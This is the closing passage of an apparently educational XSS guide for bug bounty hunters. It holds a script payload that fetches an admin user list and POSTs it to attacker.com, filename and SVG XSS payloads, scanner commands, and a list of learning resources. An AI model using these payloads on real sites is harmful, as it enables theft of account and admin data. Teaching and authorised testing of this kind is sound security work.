xhr.open('GET', '/api/admin/users', true);
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        fetch('http://attacker.com/admin-data', {
            method: 'POST',
            body: xhr.responseText
        });
    }
};
xhr.send();
">
```

#### File Upload Features
```html
<!-- Filename XSS -->
filename: "><script>alert('XSS')</script>.jpg

<!-- SVG file XSS -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
<rect width="100" height="100" fill="red"/>
</svg>
```

## 🔧 Tools and Resources

### 🛠️ Essential XSS Tools

#### Browser Extensions
```
1. XSS Hunter - Automated XSS detection
2. Hackvertor - Encoding/decoding for bypass
3. XSS Validator - Quick XSS payload testing
4. Burp Suite Extensions:
   - XSS Validator
   - XSSer
   - Reflected Parameters
```

#### Command Line Tools
```bash
# XSStrike - Advanced XSS scanner
git clone https://github.com/s0md3v/XSStrike.git
python3 xsstrike.py -u "https://target.com/search?q=test"

# Dalfox - Fast XSS scanner
go install github.com/hahwul/dalfox/v2@latest
dalfox url "https://target.com/search?q=test"

# XSSCon - XSS scanner
git clone https://github.com/menkrep1337/XSSCon.git
python3 xsscon.py -u https://target.com
```

### 📚 Learning Resources

#### Books
- **The Web Application Hacker's Handbook** - Chapter 12: Attacking Users
- **XSS Attacks: Cross Site Scripting Exploits and Defense** - Seth Fogie
- **The Tangled Web** - Michal Zalewski

#### Online Resources
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Tutorial](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

## 🎯 Key Takeaways

### ✅ Essential Skills to Master
- [ ] **Detection**: Identify XSS in various contexts and applications
- [ ] **Classification**: Distinguish between reflected, stored, and DOM XSS
- [ ] **Exploitation**: Craft effective payloads for different scenarios
- [ ] **Bypass**: Circumvent filters and security controls
- [ ] **Impact Assessment**: Understand and demonstrate real-world impact

### 🚀 Advanced Techniques to Learn
- [ ] **Filter evasion** - Advanced encoding and obfuscation techniques
- [ ] **Context-specific exploitation** - Tailor payloads to specific contexts
- [ ] **Chaining attacks** - Combine XSS with other vulnerabilities
- [ ] **Automation** - Build custom tools and scanners
- [ ] **Social engineering** - Craft convincing attack scenarios

### 💡 Pro Tips for Bug Bounty Hunters
1. **Test all input fields** - Forms, URL parameters, headers, cookies
2. **Check different contexts** - HTML, JavaScript, CSS, attribute contexts
3. **Try various payloads** - Don't rely on a single payload type
4. **Look for stored XSS** - Higher impact and better bounties
5. **Test file uploads** - Often overlooked attack vector
6. **Check mobile interfaces** - Different security controls
7. **Combine with other bugs** - CSRF + XSS, IDOR + XSS
8. **Document impact clearly** - Show real-world exploitation scenarios

---

## 📝 Author & Credits

**Created by: LakshmiKanthanK(letchupkt)**

🔗 **Connect with me:**
- 🌐 **Portfolio**: [letchupkt.vgrow.tech](https://letchupkt.vgrow.tech)
- 📸 **Instagram**: [@letchu_pkt](https://instagram.com/letchu_pkt)
- 💼 **LinkedIn**: [lakshmikanthank](https://linkedin.com/in/lakshmikanthank)
- ✍️ **Medium**: [letchupkt.medium.com](https://letchupkt.medium.com)

---

**⚖️ Legal Reminder**: Only test XSS on systems you own or have explicit permission to test. Always follow responsible disclosure practices and respect bug bounty program rules.

**🎯 Next Steps**: Practice on the provided labs, study real-world examples, and gradually work your way up to more complex scenarios. XSS mastery comes with understanding context and creative payload development.

*© 2025 LetchuPKT. Part of the Complete Bug Bounty Hunting Roadmap 2025.*